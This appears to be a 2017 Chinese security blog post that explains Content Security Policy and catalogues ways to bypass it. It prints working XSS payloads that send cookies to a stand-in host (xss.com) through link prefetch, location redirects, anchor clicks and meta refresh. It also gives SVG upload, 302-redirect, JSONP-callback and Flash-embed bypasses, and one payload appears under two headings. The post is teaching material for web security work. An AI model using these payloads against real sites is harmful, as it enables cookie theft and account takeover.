---
title: 内容安全策略（CSP）及绕过
date: 2017-09-16 01:46:09
tags: WEB安全
---
#内容安全策略（CSP）及绕过

####定义
>内容安全策略以白名单的机制来管理网站加载或执行的资源。在网页中，这样的策略是通过 HTTP 头信息或者 meta 标签来定义的。

####设置的两种方式
* > 通过 HTTP 头信息的Content-Security-Policy的字段
   ```text
   Content-Security-Policy 字段
   ```
* > 通过网页的<meta>标签。
```text
   <meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:">
 ```

测试CSP是否合理
[google evaluator](https://csp-evaluator.withgoogle.com/)
 ***
 绕过总结

#### 基于新标签的绕过
```text
    由于<link>标签最新的rel属性dns-prefetch尚未被加入csp实现中
使用如下payload,即可发出一条dns解析请求,在ns服务器查看可得到内容
<link rel="dns-prefetch" href="[cookie].xss.com">dns-p
 ```

#### 基于跳转的绕过
>以下的方式都无需交互
>缺点是可能被发现,因此可以采取在目标页面再跳转回来的方法
>设置default-src 'self';script-src 'self' 'unsafe-inline

* location.href
```script
 window.location="http://www.xss.com/x.php?c=[cookie]";
```

* a 标签点击
```script
    var a=document.createElement("a");
    a.href='http://www.xss.com/?c='+escape(document.cookie);
    a.click();
    Firefox不可用
```

* meta标签
```html
<meta http-equiv="refresh" content="5;url=http://www.xss.com/x.php?c=[cookie]" >
```
> 设置严格的CSP
> default-src 'self'; script-src 'self';

* 302跳转
```text
如果我们的script-src设置为某个目录,通过这个目录下的302跳转,是可以绕过csp读取到另一个目录下的脚本的。
在我的例子是这样设置的Content-Security-Policy: default-src 'self';script-src http://127.0.0.1/a/ ;
csp限制了/a/目录,而我们的目标脚本在/b/目录下则如果这时候请求redirect页面去访问/b/下的脚本
是可以通过csp的检查的,比如<script src="http://127.0.0.1/a/redirect.php?url=/b/2" ></script>
但是就如官网中描述的,加载的资源所在的域必须和自身处于同域下(example.com)也就是不可能通过302跳转去加载一个其他域下的脚本的。
比如通过a.com的302跳转去加载b.com下的脚本所以这种方法仍然有一定的局限性,但是对于那些限制死了只能加载某个目录下的js的情况
仍然有比较好的绕过效果
```
>这个漏洞是可以绕过CSP对js脚本当前目录的限制

总结
```
1、在script-src允许的域下，需要存在一个重定向的页面，这种页面大多存在于登陆，退出登录。
2、在script-src允许的域下，存在某个任意文件的上传点（任意目录）。
3、有特别的方式跨域发送请求，或者有站内域可以接受请求。
```
#### 文件上传功能带来的bypass
* apache
```
没有返回content-type,而这时,我们的文件是会被直接当作html解析的
```
* nginx
```
我们尝试上传一个.svg文件,这样的矢量图现在也已经被广泛的应用
内容如下
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(URL)"/>
```
因此,如果网站允许上传.svg文件,在nginx等情况下也是可以执行内联js的

#### 基于 CDN 绕过CSP
> 设置 default-src 'self' ajax.googleapis.com'

绕过方法
* 用cdn的回调函数(要绕过xss Auditor)
```txt
http://127.0.0.1/ctest/test.php?xss=%22%3E%3Cscript%20src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert&context=1337%3E%3C/script%3E
```
* 通过目录绕过，引入一个AngularJS
```txt
"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>
```
* 通过flash绕过
```txt
"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>
```

####
* firefox和ie
[Firefox53 & Edge40 Browsers CSP Bypass](https://www.n0tr00t.com/2017/05/10/Firefox-and-Edge-Browsers-CSP-Bypass.html)

* Safari


